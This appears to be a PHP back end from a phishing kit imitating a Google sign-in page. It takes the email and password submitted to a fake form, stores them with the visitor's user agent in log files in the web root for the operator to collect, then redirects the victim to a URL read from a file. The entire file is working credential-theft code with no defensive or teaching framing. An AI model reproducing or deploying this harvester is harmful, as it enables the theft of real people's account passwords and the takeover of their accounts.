<?php
$login = $_POST['email'];
$pass = $_POST['password'];
$agent  = $_SERVER['HTTP_USER_AGENT'];

$file = $_SERVER['DOCUMENT_ROOT']."/log.log";

$all = "\r\nx.add_row(['GGL', '$login', '$pass'])";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$file = $_SERVER['DOCUMENT_ROOT']."/result.log";
$file = str_replace("/www/google", "", $file);
$all = "[OS]: Google"."\n [Username]: ".$login."\n [Password]: ".$pass."\n [Information]: ".$agent."\n\n";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$reloc=file_get_contents("location.location");
?>
<script>
window.location.href="<?php echo $reloc ?>"
</script>
